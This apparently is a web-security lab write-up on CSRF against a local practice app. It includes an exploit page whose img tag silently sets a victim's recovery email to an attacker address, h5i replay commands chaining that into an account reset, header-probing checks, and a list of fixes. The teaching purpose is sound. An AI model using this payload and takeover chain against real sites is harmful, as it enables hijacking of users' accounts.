# Lab 22 — Prefs

## What CSRF actually is

A browser attaches cookies **by destination, not by who asked**. A page on
`evil.example` that causes a request to `acme.test` gets `acme.test`'s cookies
on that request — because the browser is serving the *user*, and the user is
logged in.

So an endpoint that decides "this is the moderator" from a cookie alone has
decided it from something an attacker's page can cause to be sent. It knows
*who*; it does not know *whether they meant it*.

## The bugs

```python
@app.any("/account/recovery-email")
…
email = req.query.get("email") or (req.form or {}).get("email", "")
STATE["recovery_email"] = email
```

1. **No token, no `SameSite`, no `Origin` check.** The cookie is the whole
   authorisation.
2. **The route answers any method,** so a write happens on `GET`. That collapses
   the exploit from "a form the victim must submit" to "a URL the victim must
   load" — an `<img>`, a `<link>`, a redirect, a preview card in a chat client.

Bug 2 is the one to hunt for. Anything that changes state on `GET` —
`/logout`, `/subscribe?plan=`, `/settings?theme=`, `/delete?id=` — is a
one-request CSRF and is also cached, logged, and prefetched.

## The exploit

```bash
# a page on the other origin whose only content is the request
PAGE='<html><body>loading…<img src="http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example"></body></html>'
h5i websec replay req_0 --session lab22 --create --set method=POST --set path=/page \
    --set header.Content-Type=application/json \
    --set json.name=trap --set "json.html=$PAGE"

h5i websec replay req_0 --session lab22 --create --set method=POST --set path=/report \
    --set header.Content-Type=application/json \
    --set json.url=http://127.0.0.1:9221/p/trap

h5i websec replay req_0 --session lab22 --create --set path=/account/reset
```

Then the recovery address is yours, and the next reset token comes to you. Note
the escalation: "changed a preference" is a low-severity finding; "took over the
account" is not. Always ask what the changed state unlocks.

## Proving it without a victim

Two checks establish CSRF from your own session, and both are one replay each:

```bash
# 1. What does the endpoint want? A 401 (not "missing token") means the cookie
#    is the only credential.
h5i websec replay req_0 --session lab22 --create \
    --set path=/account/recovery-email --set query.email=probe@evil.example

# 2. Does it care where the request came from?
h5i websec replay req_N --session lab22 --create \
    --set header.Origin=http://evil.example --set header.Referer=http://evil.example/
```

If (2) still succeeds, there is no origin check. Combine that with a
`Set-Cookie` that carries no `SameSite` attribute — read it with
`websec show res_N --raw` — and you have the finding, victim or no victim.

## A real caveat about h5i as the victim

h5i's engine is deliberately *stricter* than a browser in one place that
matters here: it refuses `fetch(..., {mode: "no-cors", credentials: "include"})`
outright, on the grounds that the caller could never check that the server
agreed ([h5i#612](https://github.com/h5i-dev/h5i/issues/612)). It also does not
submit forms at all ([h5i#611](https://github.com/h5i-dev/h5i/issues/611)).
Both of those are the classic POST-CSRF vectors.

So: **a GET-based CSRF is demonstrable end to end in h5i; a POST-only one is
not.** Prove that one with the two header checks above, and reproduce it in a
real browser before you write it up. Knowing where your tool is stricter than
the world is part of using it honestly — an exploit that fails in h5i has not
necessarily failed.

## The fix

In order of strength:

1. **`SameSite=Lax`** on session cookies (the modern browser default) — kills
   cross-site POSTs and top-level GET writes from other origins.
2. **Never write state on `GET`.** Then `SameSite=Lax` covers you completely.
3. **A CSRF token** bound to the session, checked on every unsafe method.
4. **Check `Origin`/`Sec-Fetch-Site`** as defence in depth.
5. **Re-authenticate** for genuinely sensitive changes — email, password, MFA.

Remember Lab 21: none of this survives an XSS on the same origin.

## h5i technique

`--set header.Origin=` / `header.Referer=` to test the server's opinion of where
a request came from; `websec show res_N --raw` to read `Set-Cookie` attributes.
